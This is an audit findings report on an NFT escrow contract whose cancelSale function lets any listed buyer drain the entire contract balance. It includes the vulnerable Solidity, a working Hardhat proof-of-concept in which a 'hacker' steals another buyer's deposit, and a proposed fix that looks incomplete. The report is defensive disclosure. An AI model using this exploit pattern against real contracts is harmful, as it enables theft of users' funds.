# Mishandling of ETH - Findings Report

## Contest Summary
Date: April 20th 2024

## Results Summary
- High: 1
- Medium: 0
- Low: 0

## Risk Findings
High-01. Unauthorized withdrawals

## Summary
The cancelSale function allows unauthorized ETH withdrawals due to the absence of a mechanism to track who deposited funds, potentially leading to loss of funds.

## Vulnerability Details
The cancelSale and finalizeSale functions are critical to the sale process. The cancelSale function transfers the entire contract balance to either the buyer or seller based on inspection status, while the finalizeSale function completes the sale only if all approvals are met. However, the lack of tracking for deposited amounts leads to potential unauthorized withdrawals.

``` solidity
function cancelSale(uint256 _nftID) public {
        if (inspectionPassed[_nftID] == false) {
            payable(buyer[_nftID]).transfer(address(this).balance);
        } else {
            payable(seller).transfer(address(this).balance);
        }
    }

function finalizeSale(uint256 _nftID) public {
        require(inspectionPassed[_nftID]);
        require(approval[_nftID][buyer[_nftID]]);
        require(approval[_nftID][seller]);
        require(approval[_nftID][lender]);
        require(address(this).balance >= purchasePrice[_nftID]);
        isListed[_nftID] = false;
        (bool success, ) = payable(seller).call{value: address(this).balance}(
            ""
        );
        require(success);
        IERC721(nftAddress).transferFrom(address(this), buyer[_nftID], _nftID);
    }
```
## Impact
 - Scenario 1: Buyer 1 deposited 1 ETH for NFT 1, while Buyer 2 did not deposit for NFT 2. 
 - Scenario 2: Buyer 2 exploited a vulnerability to cancel the sale, risking theft from Buyer 1.

 ## POC
 ```solidity

  describe("ETH Mishandling in Cancel Sale", () => {
        describe("Failure", async () => {
            it("Check for deposit earnest", async () => {
                const nftId_1 = 1
                const nftId_2 = 2
                // Deposit for NFT 1
                const depositTx = await escrow.connect(buyer).depositEarnest(1, {
                    value: tokens(5)
                })
                await depositTx.wait()
                // Escrow balance before
                const escrowBalanceBefore = await escrow.getBalance()
                // Hacker balance before
                const hackerBalanceBefore = await hre.ethers.provider.getBalance(hacker.address)
                // Inspector passes inspection for NFT 1
                const inspectionTx1 = await escrow.connect(inspector).updateInspectionStatus(1, true)
                await inspectionTx1.wait()
                // Approve sale by buyer, seller and lender for NFT 1
                const approveTx1 = await escrow.connect(buyer).approveSale(1)
                await approveTx1.wait()
                const approveTx2 = await escrow.connect(seller).approveSale(1)
                await approveTx2.wait()
                const approveTx3 = await escrow.connect(lender).approveSale(1)
                await approveTx3.wait()
                // Lender send ETH to the contract for NFT 1
                const inspectionTx2 = await lender.sendTransaction({
                    to: escrow.address,
                    value: tokens(5)
                })
                // Mint NFT 2
                const mintTx2 = await realEstate.connect(seller).mint("https://ipfs.io/ipfs/QmTudSYeM7mz3PkYEWXWqPjomRPHogcMFSq7XAvsvsgAPS")
                await mintTx2.wait()
                // Approve NFT 2 for Escrow
                const approveTx = await realEstate.connect(seller).approve(escrow.address, 2);
                await approveTx.wait()
                // List NFT 2
                const listTransaction2 = await escrow.connect(seller).list(2, hacker.address, tokens(15), tokens(10))
                await listTransaction2.wait()
                // Hacker cancel sale for NFT 2
                const cancelTx = await escrow.connect(hacker).cancelSale(2);
                await cancelTx.wait()
                // Check Escrow balance after cancel sale   
                const escrowBalanceAfter = await escrow.getBalance()
                expect(escrowBalanceAfter).to.equal(0)
                // Hacker balance after
                const hackerBalanceAfter = await hre.ethers.provider.getBalance(hacker.address)
                expect(hackerBalanceAfter).to.be.greaterThan(hackerBalanceBefore)
                // Finalize sale for NFT 1
                await expect(escrow.connect(seller).finalizeSale(1)).to.be.revertedWith("Escrow: Insufficient balance")
            })
        })
 ```

 ## Tools Used
 Sublime, Hardhat

## Recommendations
Add a new mapping: 
- mapping(`address` => `uint256`) public `deposited`

```solidity
function finalizeSale(uint256 _nftID) public {
        uint256 escrowAmount = escrowAmount[_nftID];
        address buyerAddress = buyer[_nftID];
        uint256 depositedAmount = deposited[buyerAddress];
        
        // Ensure buyer has enough funds deposited
        require(deposited[buyerAddress] >= escrowAmount, "Escrow: Insufficient deposited funds");

        // NFT passed inspection
        require(inspectionPassed[_nftID], "Escrow: NFT inspection not passed");

        // Buyer approval required
        require(approval[_nftID][buyer[_nftID]], "Escrow: Buyer not approved");

        // Seller approval required
        require(approval[_nftID][seller], "Escrow: Seller not approved");

        // Lender approval required
        require(approval[_nftID][lender], "Escrow: Lender not approved");

        // Contract balance insufficient for purchase
        require(address(this).balance >= escrowAmount, "Escrow: Insufficient balance");

        // Transfer funds to the seller
        isListed[_nftID] = false;
          (bool success, ) = payable(seller).call{value: address(this).balance}(
            ""
        );
        require(success);

          // Reset deposited amount
        deposited[buyerAddress] = 0;

        // Transfer the NFT ownership to the buyer
        IERC721(nftAddress).transferFrom(address(this), buyerAddress, _nftID);
    }

function cancelSale(address _buyer, uint256 _nftID) public {    
        uint256 refundAmount = deposited[_buyer];
        require(refundAmount > 0, "Escrow: No deposited amount to finalize the sale");
        deposited[_buyer] = 0;

        if (inspectionPassed[_nftID] == false) {
            payable(buyer[_nftID]).transfer(refundAmount);
        } else {
            payable(seller).transfer(refundAmount);
        }
    } 
```